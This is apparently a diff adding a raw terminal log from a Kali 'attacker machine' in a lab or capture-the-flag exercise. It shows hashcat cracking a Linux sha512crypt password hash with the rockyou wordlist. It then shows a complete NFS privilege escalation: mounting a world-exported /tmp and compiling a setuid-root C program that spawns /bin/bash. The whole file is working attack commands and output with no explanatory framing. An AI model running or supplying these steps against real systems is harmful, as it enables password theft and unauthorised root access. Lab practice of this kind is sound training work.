@@ -1,0 +1,105 @@
+//Attacker Machine//
+
+Machine not connected to ssh:
+┌──(root💀kali)-[~]
+└─# nano unshadowed
+
+──(root💀kali)-[~]
+└─# hashcat -m 1800 unshadowed /usr/share/wordlists/rockyou.txt -O
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-7200U CPU @ 2.50GHz, 1423/1487 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 15
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Optimized-Kernel
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Uses-64-Bit
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Initializing backend runtime for device #1...
+Host memory required for this attack: 64 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 999999
+* Bytes.....: 8529117
+* Keyspace..: 999999
+
+$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: sha512crypt $6$, SHA512 (Unix)
+Hash.Target......: $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIy...fGxJI0
+Time.Started.....: Sat May 15 04:09:33 2021 (3 secs)
+Time.Estimated...: Sat May 15 04:09:36 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      449 H/s (7.14ms) @ Accel:128 Loops:128 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 1280/999999 (0.13%)
+Rejected.........: 0/1280 (0.00%)
+Restore.Point....: 1024/999999 (0.10%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
+Candidates.#1....: time -> cthutq
+
+Started: Sat May 15 04:09:21 2021
+Stopped: Sat May 15 04:09:37 2021
+                                                                                       
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+┌──(root💀kali)-[~]
+└─# showmount -e 10.10.132.224                                                       1 ⨯
+Export list for 10.10.132.224:
+/tmp *
+                                                                                         
+┌──(root💀kali)-[~]
+└─# mkdir /tmp/1        
+                                                                                         
+┌──(root💀kali)-[~]
+└─# mount -o rw,vers=2 10.10.132.224:/tmp /tmp/1
+                                                                                         
+┌──(root💀kali)-[~]
+└─# echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
+                                                                                         
+┌──(root💀kali)-[~]
+└─# gcc /tmp/1/x.c -o /tmp/1/x
+/tmp/1/x.c: In function ‘main’:
+/tmp/1/x.c:1:14: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+    1 | int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
+      |              ^~~~~~
+/tmp/1/x.c:1:25: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+    1 | int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
+      |                         ^~~~~~
+/tmp/1/x.c:1:36: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
+    1 | int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
+      |                                    ^~~~~~
+                                                                                         
+┌──(root💀kali)-[~]
+└─# chmod +s /tmp/1/x
+                                                                                         
